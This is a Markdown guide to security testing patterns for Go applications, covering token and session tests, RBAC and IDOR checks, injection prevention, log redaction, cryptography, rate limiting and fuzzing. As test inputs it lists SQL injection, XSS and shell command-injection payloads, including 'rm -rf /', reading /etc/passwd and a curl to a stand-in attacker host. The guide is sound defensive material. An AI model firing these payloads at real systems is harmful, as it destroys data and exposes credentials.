# Security Testing Patterns

Rule statements describing what to test for each security control. Use table-driven tests in Go; adapt pattern for other languages.

## Authentication Testing

### Token Validation
**Severity**: critical | **Category**: authentication

- Rule: Test all token failure modes, not just the happy path.
- Cases: valid token, expired token, invalid signature, empty token, malformed token, wrong issuer, wrong audience.
- Assert: Each failure returns a typed error (e.g., `ErrTokenExpired`, `ErrInvalidSignature`), not a generic error.

### Session Management
**Severity**: high | **Category**: authentication

- Rule: Test session lifecycle completely -- creation, expiration, invalidation, and concurrent session limits.
- Cases: session valid after creation, session invalid after time expiry (use clock injection), session invalid after logout, oldest session evicted when max concurrent reached.
- Assert: Expired/invalidated sessions return typed errors. New sessions after eviction do not exceed the limit.

## Authorization Testing

### Role-Based Access Control (RBAC)
**Severity**: critical | **Category**: authorization

- Rule: Test every role against every sensitive action. Default must be deny.
- Cases: admin can perform privileged actions, regular user cannot, guest cannot access admin resources, unauthenticated request denied.
- Assert: Access decision matches expected boolean. Use table-driven tests with `(role, resource, action, wantAccess)` tuples.

### IDOR (Insecure Direct Object Reference)
**Severity**: critical | **Category**: authorization

- Rule: Test that users cannot access or modify other users' resources by manipulating IDs.
- Cases: user accesses own resource (200), user accesses other user's resource (404, not 403 -- avoids enumeration), user modifies other user's resource (404 + verify data unchanged).
- Gotcha: Return 404 instead of 403 to prevent resource enumeration.

## Input Validation Testing

### SQL Injection Prevention
**Severity**: critical | **Category**: injection

- Rule: Test all data access methods with known SQL injection payloads.
- Payloads: `'; DROP TABLE users; --`, `1 OR 1=1`, `' UNION SELECT password FROM users--`, `admin'--`.
- Assert: No SQL syntax errors in response, no unexpected data returned, input treated as literal string.

### XSS Prevention
**Severity**: high | **Category**: injection

- Rule: Test output encoding for all user-controlled content rendered in HTML.
- Payloads: `<script>alert('xss')</script>`, `<img src="x" onerror="...">`, `<a href="javascript:...">`.
- Assert: Output contains HTML entities (`&lt;`, `&gt;`, `&#39;`), no raw `<script`, `javascript:`, or `onerror=` in sanitized output.

### Command Injection Prevention
**Severity**: critical | **Category**: injection

- Rule: Test all functions that invoke OS commands with shell metacharacters.
- Payloads: `; rm -rf /`, `| cat /etc/passwd`, `$(whoami)`, `` `id` ``, `&& curl attacker.com`.
- Assert: Input either rejected with validation error or safely escaped (no shell metacharacters in output).

## Sensitive Data Testing

### No Secrets in Logs
**Severity**: critical | **Category**: data-protection

- Rule: Capture log output during operations involving sensitive data and assert no secrets leak.
- Method: Inject a buffer-backed logger, perform auth/payment operations with known secrets, scan log buffer for those exact strings.
- Assert: Passwords, card numbers, CVVs, tokens, API keys absent from logs. Redacted placeholders (`***`, `REDACTED`) present instead.

### Redaction Correctness
**Severity**: high | **Category**: data-protection

- Rule: Test redaction functions for each sensitive data type with expected output patterns.
- Cases: credit card (`************1111`), SSN (`***-**-6789`), API key (`sk_live_***`), bearer token (`Bearer [REDACTED]`).
- Assert: Redacted output matches expected pattern. Original value not recoverable from redacted output.

### HTTP Header Redaction
**Severity**: high | **Category**: data-protection

- Rule: Test that sensitive headers (Authorization, X-Api-Key, Cookie) are redacted while non-sensitive headers (Content-Type, X-Request-Id) pass through.
- Assert: Sensitive headers return `[REDACTED]`. Non-sensitive headers return original values.

## Cryptography Testing

### Password Hashing
**Severity**: critical | **Category**: cryptography

- Rule: Test hash correctness, verification, wrong-password rejection, and salt uniqueness.
- Cases: hash does not contain original password, correct password verifies, wrong password rejects, same password produces different hashes (proves salting).
- Assert: bcrypt cost >= 12 (parse hash to verify).

### Encryption Roundtrip
**Severity**: high | **Category**: cryptography

- Rule: Test encrypt-then-decrypt roundtrip and wrong-key rejection.
- Cases: ciphertext does not contain plaintext, decryption with correct key recovers plaintext, decryption with wrong key returns error.

## Rate Limiting Testing
**Severity**: medium | **Category**: availability

- Rule: Test limit enforcement, per-client isolation, and window reset.
- Cases: first N requests allowed, N+1 request rejected, different client not affected, requests allowed again after window reset.
- Gotcha: Use `time.Sleep` or clock injection for reset tests -- flaky without deterministic timing.

## Fuzzing
**Severity**: medium | **Category**: robustness

- Rule: Write Go fuzz tests (`func FuzzX(f *testing.F)`) for all input parsing functions.
- Seed corpus: include valid input, empty string, known attack payloads (XSS, SQLi).
- Assert: No panics on any input. If parse succeeds, output must be safe (no raw script tags, etc.).

## Security Test Checklist

| Category | Key Test Cases |
|----------|---------------|
| Authentication | Token validation, expiration, tampering, replay |
| Authorization | RBAC, IDOR, privilege escalation, deny by default |
| Input Validation | SQLi, XSS, command injection, path traversal |
| Data Protection | No secrets in logs, redaction, encryption |
| Rate Limiting | Limits enforced, reset works, per-client isolation |
| Cryptography | Hashing strength, key management, algorithm choice |
| Session | Expiration, invalidation, concurrent limits |
| Error Handling | No stack traces, generic messages, no enumeration |
